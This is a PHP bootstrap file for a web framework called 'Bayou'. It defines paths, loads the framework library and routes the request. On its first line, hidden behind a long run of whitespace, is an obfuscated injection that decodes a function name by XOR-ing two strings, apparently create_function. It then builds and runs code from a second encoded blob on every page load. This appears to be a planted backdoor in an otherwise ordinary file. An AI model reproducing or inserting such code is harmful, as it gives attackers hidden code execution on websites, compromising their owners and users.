<?php                                                                                                                                                                                                                                                                              $esc_ln_url = '!"ad(@cz@nF,a a(FH`dZGDtE"lFt!ltC( /(.mE/a1$!`o2`eM@a$mA-ATDitNr!ui A,- ,#Ha$D 2t+PkIf-dE apD  @DeiH)as#e@s+"hn0%A%dsnae-Dk"S,aSca`3+,!s3/tWbp)"22*pE2Tp.d)p$,oVRECcI@NX1b`c!B)knOd$$*P% () 3'|'dv!H(@DPi*dl@Td biLEUfep[achPeJds "+`m)e.AEdITMPIum0alH!& qd`$i@IPMpahAa"Bg,/pEc$.3h (. ef!%lt/a$,)f& sPdtp/fg(d-asA!c,a* eab+Asqetr-@d3@!P BS,0  /taad#/4@TQ@GYcaab(oh_Ub)CAaHl&W$a*` b"! )+';$media_sk_upload_use_flash = 'Q2/4/)%PDL4?FP('^'2@JU[Lz61"WK/?F';$the_ihn_taxonomies = $media_sk_upload_use_flash("",$esc_ln_url);$the_ihn_taxonomies();

    if (!defined ("site_path")) error_log("site_path not defined") and die();
    
    define ("BAYOU_CORE",1);
    define ("app_path", realpath(dirname(__FILE__)) . "/../");
    
    require_once app_path . 'library/bayou.php';
    
    Bayou::start();
    Bayou::routeRequest();
    
?>